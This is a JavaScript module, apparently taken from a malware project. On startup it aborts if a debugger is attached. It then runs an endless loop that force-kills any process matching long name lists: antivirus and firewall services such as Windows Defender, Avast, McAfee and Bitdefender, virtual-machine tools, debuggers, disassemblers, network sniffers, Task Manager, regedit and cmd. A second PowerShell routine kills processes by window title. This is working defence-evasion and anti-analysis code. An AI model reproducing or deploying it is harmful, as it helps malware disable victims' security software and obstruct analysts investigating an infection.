const {
    delay,
    execPowerShell,
} = require("../../utils/harware/processes.js");

const finishProcess = async (pid) => {
    try {
        process.kill(pid);
    } catch (error) {
        console.error(error.message);
    }
}

const finishProcessesByNames = async (blacklist) => {
    try {
        const allProcessesOutput = await execPowerShell('Get-Process | Select-Object -Property Name, Id');
        const processLines = allProcessesOutput.trim().split('\r\n');

        const processMap = new Map();

        processLines.forEach(line => {
            const parts = line.split(/\s+/);
            if (parts.length < 2) return;

            const name = parts.slice(0, -1).join(' ');
            const id = parts[parts.length - 1];
            const pid = parseInt(id, 10);

            if (!isNaN(pid)) {
                processMap.set(name.toLowerCase(), pid);
            }
        });

        const blacklistLower = blacklist.map(item => item.toLowerCase());

        const pidkill = [];

        for (const [processName, pid] of processMap.entries()) {
            if (blacklistLower.some(item => processName.includes(item))) {
                pidkill.push(
                    finishProcess(pid).catch(error => {})
                );
            }
        }

        await Promise.all(pidkill);
    } catch (error) {
        console.error(error.message);
    }
};


const finishProcessesByWindowsNames = async (blacklist) => {
    const blacklistEscaped = blacklist.map(name => name.replace(/'/g, "''")).join(',');

    const callbackScript = `
        $blacklist = @(${blacklist.map(name => `'${name}'`).join(',')})
        $windows = Get-WmiObject -Class Win32_Process
        foreach ($window in $windows) {
            $title = $window.WindowTitle
            if ($title -ne "" -and $blacklist -contains $title.ToLower()) {
                Stop-Process -Id $window.ProcessId -Force
            }
        }
    `;

    try {
        await execPowerShell(callbackScript);
    } catch (error) {
        console.error(error.message);
    }
}

const isDebuggerPresent = async () => {
    try {
        const result = await execPowerShell('[System.Diagnostics.Debugger]::IsAttached');
        return result.trim() === 'True';
    } catch (error) {
        return false;
    }
}

module.exports = async () => {
    if (await isDebuggerPresent()) {
        process.abort();
    }

    const blacklist = ['cmd', 'MsMpEng', 'cfp', 'AvastSvc', 'ccSvcHst', 'mcshield', 'vsmon', 'avgfwsvc', 'ashDisp', 'avp', 'MPFTray', 'Outpost', 'tinywall', 'glasswire', 'peerblock', 'smc', 'bdagent', 'oaui', 'pctfw', 'pfw', 'SPFConsole', 'afwServ', 'egui', 'ndf', 'avwsc', 'fkp', 'fsaua', 'avktray', 'rfwmain', 'zlclient', 'uiWinMgr', 'WRSA', 'mcuimgr', 'avgnt', 'sfmon', 'zatray', 'BavPro_Setup', 'apwiz', 'pfw7', 'jpfsrv', 'pztray', 'isafe', 'BullGuard', 'PSUAMain', 'SBAMSvc', 'nlclientapp', 'woservice', 'op_mon', 'WSClientservice', 'wfc', 'kicon', 'avgtray', 'npfmsg', 'jpf', 'WRSSSDK', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver', 'regedit', 'wireshark', 'vmusrvc', 'taskmgr', 'vmwareservice', 'httpdebuggerui', 'fakenet', 'fiddler', 'dumpcap'];
    const callbackBlacklist = ['debugger', 'extremedumper', 'pc-ret', 'folderchangesview', 'james', 'process monitor', 'protection_id', 'de4dotmodded', 'x32_dbg', 'pizza', 'fiddler', 'system explorer', 'mdbg', 'kdb', 'charles', 'stringdecryptor', 'phantom', 'windbg', 'mdb', 'harmony', 'systemexplorerservice', 'megadumper', 'sharpod', 'http debugger', 'dbgclr', 'x32dbg', 'sniffer', 'petools', 'scyllahide', 'kgdb', 'systemexplorer', 'proxifier', 'debug', 'httpdebug', 'httpdebugger', '0harmony', 'mitmproxy', 'ida -', 'simpleassembly', 'ksdumper', 'dnspy', 'x96dbg', 'de4dot', 'exeinfope', 'x64_dbg', 'httpanalyzer', 'strongod', 'wireshark', 'gdb', 'graywolf', 'x64dbg', 'ksdumper v1.1 - by equifox', 'wpe pro', 'ilspy', 'dbx', 'ollydbg', 'x64netdumper', 'codecracker', 'ghidra', 'titanhide', 'hxd', 'reversal', 'simpleassemblyexplorer', 'dojandqwklndoqwd', 'procmon64', 'process hacker',];

    while (true) {
        await finishProcessesByNames(blacklist);
        await finishProcessesByWindowsNames(callbackBlacklist);

        await delay(1000);
    };
}